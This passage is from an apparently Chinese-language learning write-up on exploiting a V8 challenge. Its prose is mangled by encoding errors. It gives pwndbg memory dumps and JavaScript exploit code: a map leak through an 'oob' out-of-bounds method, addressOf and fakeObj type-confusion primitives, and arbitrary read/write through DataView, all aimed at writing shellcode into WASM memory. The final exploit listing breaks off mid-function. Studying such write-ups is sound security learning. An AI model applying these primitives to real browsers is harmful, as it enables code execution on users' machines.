(COW)]</span><br><span class="line"> - length: 4</span><br><span class="line"> - properties: 0x10c0b3540c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x15d18a8001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x20bd84310a41 &lt;FixedArray[4]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line">           3: 4</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; tel 0x20bd84310a41</span><br><span class="line">00:0000â”‚  0x20bd84310a41 â—‚â€” 0x10c0b35408</span><br><span class="line">01:0008â”‚  0x20bd84310a49 â—‚â€” 0x4000000</span><br><span class="line">02:0010â”‚  0x20bd84310a51 â—‚â€” 0x1000000</span><br><span class="line">03:0018â”‚  0x20bd84310a59 â—‚â€” 0x2000000</span><br><span class="line">04:0020â”‚  0x20bd84310a61 â—‚â€” 0x3000000</span><br><span class="line">05:0028â”‚  0x20bd84310a69 â—‚â€” 0x5100000004000000</span><br><span class="line">06:0030â”‚  0x20bd84310a71 â—‚â€” 0x10c0b35408</span><br><span class="line">07:0038â”‚  0x20bd84310a79 â—‚â€” 0x2900000004000000</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>æ€ªï¼Œå¯ä»¥çœ‹è§åœ¨ <code>elements</code> åˆ° <code>obj</code> çš„ä¸­é—´å­˜åœ¨ä¸€äº›æ•°æ®ï¼Œäºæ˜¯æˆ‘å¥½å¥‡å»çœ‹çœ‹è¿™æ˜¯ä»€ä¹ˆä¸œè¥¿  </p><img src="/2024/05/05/v8start/8.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¥½å®¶ä¼™ï¼Œå±…ç„¶è¿˜ä¼šå­˜åœ¨ä¸€ä¸ªåˆ«çš„ç»“æ„ã€‚ç®—äº†ï¼Œè¿™ä¸æ˜¯æˆ‘è¿™ä¸ªåˆå­¦è€…è¯¥äº†è§£çš„ä¸œè¥¿ï¼Œç­‰å­¦æ·±å…¥äº†å†ç ”ç©¶å§ï¼Œæš‚æ—¶ä¸å½±å“è§£é¢˜<br>æ—¢ç„¶å…¨ä¸ºæ•´æ•°çš„ <code>array</code> çš„ <code>elements</code> æ— æ³•ç´§è´´ç€ <code>obj</code>ï¼Œé‚£å­˜åœ¨æµ®ç‚¹æ•°çš„ <code>array</code> å‘¢ï¼Ÿ<code>demo</code> ä»£ç å¦‚ä¸‹ï¼š  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0x116059b90b21 &lt;JSArray[4]&gt;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x116059b90b21</span><br><span class="line">0x116059b90b21: [JSArray]</span><br><span class="line"> - map: 0x0ce399302ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x07fe97a11111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x116059b90af1 &lt;FixedDoubleArray[4]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 4</span><br><span class="line"> - properties: 0x3ffe4d400c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x062d803001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x116059b90af1 &lt;FixedDoubleArray[4]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 2.2</span><br><span class="line">           2: 3</span><br><span class="line">           3: 4</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; tel 0x116059b90af1</span><br><span class="line">00:0000â”‚  0x116059b90af1 â—‚â€” 0x3ffe4d4014</span><br><span class="line">01:0008â”‚  0x116059b90af9 â—‚â€” 0x9a00000004000000</span><br><span class="line">02:0010â”‚  0x116059b90b01 â—‚â€” 0x9a3ff19999999999</span><br><span class="line">03:0018â”‚  0x116059b90b09 â—‚â€” 0x40019999999999</span><br><span class="line">04:0020â”‚  0x116059b90b11 â—‚â€” 0x40080000000000</span><br><span class="line">05:0028â”‚  0x116059b90b19 â—‚â€” 0xd940100000000000</span><br><span class="line">06:0030â”‚  0x116059b90b21 â—‚â€” 0x7100000ce399302e</span><br><span class="line">07:0038â”‚  0x116059b90b29 â—‚â€” 0xf100003ffe4d400c</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹è§å¸¦æµ®ç‚¹æ•°æ•°ç»„çš„ <code>elements</code> æ˜¯ç´§è´´ç€ <code>obj</code> çš„ï¼Œè¿™ç¬¦åˆæˆ‘ä»¬æ¼æ´çš„åˆ©ç”¨<br>é¦–å…ˆå°è¯•åˆ©ç”¨ä¸€ä¸‹èƒ½å¦åˆ©ç”¨è¯¥æ¼æ´æ¥æ³„éœ²å‡º <code>obj</code> ä¸­ <code>map</code> çš„å€¼  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] float array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(float_array_map)));</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(float_array);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼š  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="built_in">float</span> array map: 0x000029e6d51c2ed9</span><br><span class="line">0x133632fd10b1 &lt;JSArray[1]&gt;  </span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x133632fd10b1</span><br><span class="line">0x133632fd10b1: [JSArray]</span><br><span class="line"> - map: 0x29e6d51c2ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1dc4905d1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x133632fd1099 &lt;FixedDoubleArray[1]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x097d61840c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x3faa656801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x133632fd1099 &lt;FixedDoubleArray[1]&gt; &#123;</span><br><span class="line">           0: 0.1</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æˆåŠŸçš„æ³„éœ²å‡ºäº† <code>map</code>ã€‚åŒç†ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨ç±»ä¼¼çš„æ–¹æ³•å»ä¿®æ”¹ <code>map</code><br>ä¸ºäº†èƒ½å¤Ÿåœ¨ <code>WASM</code> ä¸Šå†™å…¥æˆ‘ä»¬çš„ <code>shellcode</code>ï¼Œæˆ‘ä»¬éœ€è¦ä»»æ„åœ°å€å†™å’Œåœ°å€æ³„éœ²ï¼Œè¿™æ—¶å€™å°±éœ€è¦ç”¨åˆ°ç±»å‹æ··æ·†  </p><h3 id="åœ°å€æ³„éœ²"><a href="#åœ°å€æ³„éœ²" class="headerlink" title="åœ°å€æ³„éœ²"></a>åœ°å€æ³„éœ²</h3><p>åœ¨ä¸Šé¢å·²ç»è¯´è¿‡ï¼Œ<code>v8</code> æ˜¯é€šè¿‡ <code>map</code> æ‰€æŒ‡å‘çš„åŒºåŸŸæ¥åˆ¤æ–­è¯¥å¯¹è±¡æ˜¯ä»€ä¹ˆç±»å‹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬å§ä¸€ä¸ªå­˜å‚¨ <code>obj</code> çš„ <code>array</code> çš„ <code>map</code> ä¿®æ”¹ä¸ºå­˜åœ¨æµ®ç‚¹æ•°æ•°ç»„çš„ <code>map</code>ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±èƒ½å¤Ÿç›´æ¥è·å–åˆ°è¯¥å¯¹è±¡çš„åœ°å€ã€‚æˆ‘ä»¬å¯ä»¥å°†è¯¥åŸè¯­å°è£…æˆä¸€ä¸ª <code>addressOf</code> å‡½æ•°  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> object_array_map = object_array.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] float array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(float_array_map)));</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(object_array_map)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    float_array[<span class="number">0</span>] = obj;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(float_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>addressOf</code> å‡½æ•°çš„åŠŸèƒ½ä¸ºè·å–æŒ‡å®šå¯¹è±¡ <code>obj</code> çš„åœ°å€ï¼Œå»ºè®®è¯»è€…ä»”ç»†é˜…è¯»å’Œç†è§£è¯¥å‡½æ•°çš„å®ç°åŸç†<br>åŒç†ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨ç±»ä¼¼çš„æ€è·¯æ¥å®ç°ä»»æ„åœ°å€çš„å†™ï¼Œä¸è¿‡æœ‰ä¸€ç‚¹ç‚¹ç»•  </p><h3 id="ä»»æ„åœ°å€å†™"><a href="#ä»»æ„åœ°å€å†™" class="headerlink" title="ä»»æ„åœ°å€å†™"></a>ä»»æ„åœ°å€å†™</h3><p>ä»»æ„åœ°å€å†™çš„æ€æƒ³ä¸ºä¼ªé€ ä¸€ä¸ª <code>object</code>ï¼Œæ ¹æ®ç±»å‹æ··æ·†å¯ä»¥å°†è¯¥åŸè¯­å°è£…æˆä¸€ä¸ªå‡½æ•°ï¼š  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    object_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr | <span class="number">1n</span>);</span><br><span class="line">    object_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    <span class="keyword">return</span> object_array[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜æ˜¯å¸Œæœ›è¯»è€…å¯ä»¥è‡ªè¡Œæ€è€ƒå’Œç†è§£è¯¥åŸè¯­æ˜¯å¦‚ä½•å®ç°ä¼ªé€  <code>object</code> çš„ã€‚<br>æˆ‘ä»¬ä¼ªé€ çš„ <code>object</code> æ˜¯åœ¨ <code>elements</code> ä¸Šé¢çš„ï¼Œè€Œ <code>elements</code> ä¸Šçš„æ•°æ®æ˜¯å¯æ§çš„ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‰ç…§å¦‚ä¸‹æ ·å¼ä¼ªé€ ä¸€ä¸ªå­˜åœ¨æµ®ç‚¹æ•°çš„ <code>object</code>  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> float_array_mem = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    <span class="number">0</span>,  <span class="comment">// æ²¡æœ‰åŸå‹</span></span><br><span class="line">    <span class="title function_">u2d</span>(target - <span class="number">0x10n</span>),  <span class="comment">// fake elements ptr</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x100000000n</span>),  <span class="comment">// fake length</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼ªé€ çš„æ˜¯ä¸€ä¸ªæ²¡æœ‰åŸå‹çš„å­˜åœ¨æµ®ç‚¹æ•°çš„ <code>objcet</code>ï¼Œ<code>target</code> ä¸ºæˆ‘ä»¬æƒ³è¦è¿›è¡Œå†™çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯ä¼ªé€ çš„ <code>elements</code><br>æˆ‘ä»¬å¯ä»¥åœ¨æ³„éœ²å‡º <code>float_array_mem</code> çš„åœ°å€åé€šè¿‡ <code>fakeObj(fake_obj_addr)</code> å‡½æ•°æ¥è·å–æˆ‘ä»¬çš„ <code>fake object</code>ï¼Œç„¶åå‘ <code>target</code> å†™å…¥æ•°æ®ã€‚è‡³äºä¸ºä»€ä¹ˆ <code>target</code> è¦ <code>-0x10</code> å‘¢ï¼Œå› ä¸º <code>elements</code> ä¸Šé¢æœ‰ <code>0x10</code> å­—èŠ‚ç”¨äºå­˜å‚¨ <code>map</code> å’Œ <code>length</code><br>æœ‰äº†å¯¹è±¡åœ°å€æ³„éœ²å’Œä»»æ„åœ°å€å†™ï¼Œæˆ‘ä»¬å°±ä»¥ä¸ºèƒ½å¤Ÿåœ¨ <code>WASM</code> ä¸Šæ„‰å¿«çš„å†™ <code>shellcode</code> äº†ï¼Œå¯äº‹æƒ…å¹¶æ²¡æœ‰è¿™ä¹ˆç®€å•ï¼Œå³åœ¨å†™ <code>0x7fxxxxx</code> è¿™æ ·çš„é«˜åœ°å€çš„æ—¶å€™ä¼šå‡ºç°é—®é¢˜ï¼Œåœ°å€çš„ä½ä½ä¼šè¢«ä¿®æ”¹ï¼Œå¯¼è‡´å‡ºç°è®¿é—®å¼‚å¸¸ã€‚å› ä¸ºå†™åŸè¯­ä½¿ç”¨çš„æ˜¯ <code>FloatArray</code> çš„å†™å…¥æ“ä½œï¼Œè€Œ <code>Double</code> ç±»å‹çš„æµ®ç‚¹æ•°æ•°ç»„åœ¨å¤„ç† <code>7f</code> å¼€å¤´çš„é«˜åœ°å€æ—¶ä¼šå‡ºç°å°†ä½ <code>20</code> ä½ä¸è¿ç®—ä¸º <code>0</code><br>è¿™æ—¶å€™æˆ‘ä»¬å°±è¦ä½¿ç”¨ <code>DataView </code>å¯¹è±¡ï¼Œè¯¥å¯¹è±¡çš„ç»“æ„å¦‚ä¸‹ï¼š  </p><img src="/2024/05/05/v8start/9.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è¿™æ˜¯ç”¨æ¥è¯»å†™ <code>ArrayBuffer</code> çš„ <code>BackingStore</code> çš„å†…å®¹çš„å¯¹è±¡ï¼Œåœ¨ <code>exploit</code> é‡Œå¸¸ç”¨ä½œæœ€åçš„ä»»æ„åœ°å€è¯»å†™åŸè¯­çš„æ„é€ ã€‚<br>å¯ä»¥çœ‹è§è¿™ä¸ª <code>DataView</code> å¤šäº†ä¸€ä¸ª <code>BackingStore</code>ã€‚<code>DataView</code> å¯¹è±¡ä¸­çš„ <code>backing_store</code> ä¼šæŒ‡å‘ç”³è¯·çš„ <code>data_buf</code> (<code>backing_store</code> ç›¸å½“äºæˆ‘ä»¬çš„ <code>elements</code>)ï¼Œä¿®æ”¹ <code>backing_store</code> ä¸ºæˆ‘ä»¬æƒ³è¦å†™çš„åœ°å€ï¼Œå¹¶é€šè¿‡ <code>DataView</code> å¯¹è±¡çš„ <code>setBigUint64</code> æ–¹æ³•å°±å¯ä»¥å¾€æŒ‡å®šåœ°å€æ­£å¸¸å†™å…¥æ•°æ®äº†ã€‚<br>é‚£ç°åœ¨æˆ‘ä»¬çš„æ€è·¯å°±å¾ˆæ˜ç¡®äº†ï¼Œé¦–å…ˆç”³è¯· <code>2</code> ä¸ª <code>ArrayBuffer</code> å¯¹è±¡ <code>ab1</code>ã€<code>ab2</code>ï¼Œç”³è¯·ä»–ä»¬å„è‡ªçš„ <code>DataView</code> å¯¹è±¡ <code>dv1</code>ã€<code>dv2</code>ã€‚å°†ä¼ªé€ çš„ <code>fakeobj</code> çš„ <code>elements</code> æŒ‡å‘ <code>dv1</code> çš„ <code>BackingStore-0x10</code>ï¼Œå†é€šè¿‡ä¿®æ”¹ <code>fakeobj</code> ä»¤ <code>dv1</code> çš„ <code>BackingStore</code> æŒ‡å‘ <code>dv2</code> çš„ <code>BackingStore-0x10</code><br>æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹ <code>fakeobj</code> æ¥ä¿®æ”¹ <code>dv2</code> <code>BackingStore</code> å¤„çš„å€¼ï¼Œæœ€åé€šè¿‡ <code>dv2</code> çš„å†…ç½®å‡½æ•°æ¥å®ç°ä»»æ„åœ°å€çš„è¯»å†™ã€‚æé†’ä¸€ä¸‹ï¼Œè¿™é‡Œè¦åŒºåˆ†å¼€ <code>BackingStore</code> çš„åœ°å€å’Œ <code>BackingStore</code> åœ°å€å‡ºçš„å€¼è¿™2ä¸ªæ¦‚å¿µã€‚åŸè¯­å°è£…å‡½æ•°å¦‚ä¸‹ï¼š  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_read</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">getBigUint64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_write</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> object_array_map = object_array.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] float array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(float_array_map)));</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(object_array_map)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    float_array[<span class="number">0</span>] = obj;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(float_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    object_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr | <span class="number">1n</span>);</span><br><span class="line">    object_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    <span class="keyword">return</span> 